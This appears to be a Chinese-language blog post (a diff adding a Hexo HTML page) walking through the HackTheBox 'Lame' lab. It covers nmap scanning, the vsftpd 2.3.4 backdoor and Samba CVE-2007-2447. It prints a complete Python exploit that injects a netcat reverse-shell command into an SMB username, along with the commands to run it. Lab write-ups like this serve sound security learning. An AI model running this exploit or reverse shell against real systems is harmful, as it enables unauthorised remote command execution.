@@ -1,0 +1,362 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    kaia
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="kaia" />
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Kaia</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        <a class="category-link" href="/categories/binary-security/">binary security</a></li><li><a class="category-link" href="/categories/hackthebox/">hackthebox</a>
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/puzzz" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url(https://picx.zhimg.com/v2-077a594b1a64d55e95de392755a8aa76_r.jpg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >lame</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h1 id="lame"><a href="#lame" class="headerlink" title="lame"></a>lame</h1><p>nmap</p>
+<pre class="line-numbers language-bash"><code class="language-bash">nmap -T4 -Pn -A 10.10.10.3 -p 1-65535
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>扫描结果</p>
+<pre class="line-numbers language-bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> 10.10.10.3
+Host is up <span class="token punctuation">(</span>0.26s latency<span class="token punctuation">)</span>.
+Not shown: 65530 filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
+PORT     STATE SERVICE     VERSION
+21/tcp   <span class="token function">open</span>  <span class="token function">ftp</span>         vsftpd 2.3.4
+<span class="token operator">|</span>_ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code 230<span class="token punctuation">)</span>
+<span class="token operator">|</span> ftp-syst:
+<span class="token operator">|</span>   STAT:
+<span class="token operator">|</span> FTP server status:
+<span class="token operator">|</span>      Connected to 10.10.14.3
+<span class="token operator">|</span>      Logged <span class="token keyword">in</span> as <span class="token function">ftp</span>
+<span class="token operator">|</span>      TYPE: ASCII
+<span class="token operator">|</span>      No session bandwidth limit
+<span class="token operator">|</span>      Session <span class="token function">timeout</span> <span class="token keyword">in</span> seconds is 300
+<span class="token operator">|</span>      Control connection is plain text
+<span class="token operator">|</span>      Data connections will be plain text
+<span class="token operator">|</span>      vsFTPd 2.3.4 - secure, fast, stable
+<span class="token operator">|</span>_End of status
+22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>         OpenSSH 4.7p1 Debian 8ubuntu1 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey:
+<span class="token operator">|</span>   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+139/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd 3.X - 4.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
+445/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd 3.0.20-Debian <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
+3632/tcp <span class="token function">open</span>  distccd     distccd v1 <span class="token variable"><span class="token punctuation">((</span>GNU<span class="token punctuation">)</span> <span class="token number">4.2</span>.<span class="token number">4</span> <span class="token punctuation">(</span>Ubuntu <span class="token number">4.2</span>.<span class="token number">4</span><span class="token operator">-</span>1ubuntu4<span class="token punctuation">))</span></span>
+Service Info: OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+<span class="token operator">|</span> smb-security-mode:
+<span class="token operator">|</span>   account_used: guest
+<span class="token operator">|</span>   authentication_level: user
+<span class="token operator">|</span>   challenge_response: supported
+<span class="token operator">|</span>_  message_signing: disabled <span class="token punctuation">(</span>dangerous, but default<span class="token punctuation">)</span>
+<span class="token operator">|</span>_smb2-time: Protocol negotiation failed <span class="token punctuation">(</span>SMB2<span class="token punctuation">)</span>
+<span class="token operator">|</span> smb-os-discovery:
+<span class="token operator">|</span>   OS: Unix <span class="token punctuation">(</span>Samba 3.0.20-Debian<span class="token punctuation">)</span>
+<span class="token operator">|</span>   Computer name: lame
+<span class="token operator">|</span>   NetBIOS computer name:
+<span class="token operator">|</span>   Domain name: hackthebox.gr
+<span class="token operator">|</span>   FQDN: lame.hackthebox.gr
+<span class="token operator">|</span>_  System time: 2022-04-02T04:51:23-04:00
+<span class="token operator">|</span>_clock-skew: mean: 2h07m46s, deviation: 2h49m45s, median: 7m43s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
+Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 1047.56 seconds
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>首先是21端口 vsftpd 2.3.4版本搜索发现存在笑脸漏洞</p>
+<p>原理是</p>
+<pre class="line-numbers language-bash"><code class="language-bash">此漏洞是开发者在软件中留下的后门漏洞，当连接带有vsftpd 2.3.4版本的服务器的21端口时，输入用户中带有<span class="token string">":) "</span>
+<span class="token punctuation">(</span>这大概就是此漏洞名字的来源）,密码任意，即可运行 vsf_sysutil_extra<span class="token punctuation">(</span><span class="token punctuation">)</span> ：打开服务器的6200端口，并且不需要密码
+就能从6200端口以管理员身份登入目标服务器，漏洞危害很大。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>但是通过复现后没办法利用</p>
+<p>22端口</p>
+<p>139、445端口</p>
+<p>发现smbd 3.0.20-Debian服务，搜索了下发现存在cve</p>
+<p><img src="/2022/08/21/lame/image/image_SN9xRxDf7W.png"></p>
+<p>msf查找漏洞模块</p>
+<p><img src="/2022/08/21/lame/image/image_9PSIdwSUoe.png"></p>
+<p>配置</p>
+<p><img src="/2022/08/21/lame/image/image_SZtJO14wze.png"></p>
+<p>成功！</p>
+<p><img src="/2022/08/21/lame/image/image_bmn122EOmJ.png"></p>
+<p>python升级交互式shell</p>
+<pre class="line-numbers language-bash"><code class="language-bash">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>拿到flag</p>
+<p><img src="/2022/08/21/lame/image/image_l6rRBXhf6e.png"></p>
+<p>不使用mfs的话，也找到一个脚本执行</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ozuma/CVE-2007-2447" title="https://github.com/ozuma/CVE-2007-2447">https://github.com/ozuma/CVE-2007-2447</a></p>
+<p>samba-exploit.py</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span>
+
+<span class="token comment" spellcheck="true"># Ref: https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py</span>
+<span class="token comment" spellcheck="true"># Ref: https://amriunix.com/post/cve-2007-2447-samba-usermap-script/</span>
+<span class="token comment" spellcheck="true"># Product: Samba</span>
+<span class="token comment" spellcheck="true"># Vuln: CVE-2007-2447</span>
+<span class="token comment" spellcheck="true"># Exploit-DB: https://www.exploit-db.com/exploits/16320</span>
+<span class="token comment" spellcheck="true">#</span>
+<span class="token comment" spellcheck="true"># install: pip3 install pysmb</span>
+
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> platform
+<span class="token keyword">from</span> smb<span class="token punctuation">.</span>SMBConnection <span class="token keyword">import</span> SMBConnection
+
+<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>rhost<span class="token punctuation">,</span> rport<span class="token punctuation">,</span> lhost<span class="token punctuation">,</span> lport<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> <span class="token string">'mkfifo /tmp/f; nc '</span> <span class="token operator">+</span> lhost <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> lport <span class="token operator">+</span> <span class="token string">' 0&lt;/tmp/f | /bin/sh >/tmp/f 2>&amp;1; rm /tmp/f'</span>
+    username <span class="token operator">=</span> <span class="token string">"/=`nohup "</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">"`"</span>
+    conn <span class="token operator">=</span> SMBConnection<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
+    conn<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>rhost<span class="token punctuation">,</span> int<span class="token punctuation">(</span>rport<span class="token punctuation">)</span><span class="token punctuation">)</span> 
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] CVE-2007-2447 - Samba usermap script"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">5</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] usage: python "</span> <span class="token operator">+</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" &lt;RHOST> &lt;RPORT> &lt;LHOST> &lt;LPORT>"</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]  at another terminal, $ nc -lvnp &lt;LPORT>"</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Connecting"</span><span class="token punctuation">)</span>
+        rhost <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+        rport <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># Usually 139/tcp</span>
+        lhost <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
+        lport <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>
+        exploit<span class="token punctuation">(</span>rhost<span class="token punctuation">,</span> rport<span class="token punctuation">,</span> lhost<span class="token punctuation">,</span> lport<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#安装smb模块</span>
+pip3 <span class="token function">install</span> pysmb
+<span class="token comment" spellcheck="true">#执行</span>
+python samba-exploit.py <span class="token operator">&lt;</span>RHOST<span class="token operator">></span> <span class="token operator">&lt;</span>RPORT<span class="token operator">></span> <span class="token operator">&lt;</span>LHOST<span class="token operator">></span> <span class="token operator">&lt;</span>LPORT<span class="token operator">></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2022/08/21/lame/image/image_XulqK7RAuu.png"></p>
+<p><img src="/2022/08/21/lame/image/image_rt5vBN4EeP.png"></p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'kaiasec'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://example.com/2022/08/21/lame/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://example.com/2022/08/21/lame/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//kaiasec.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
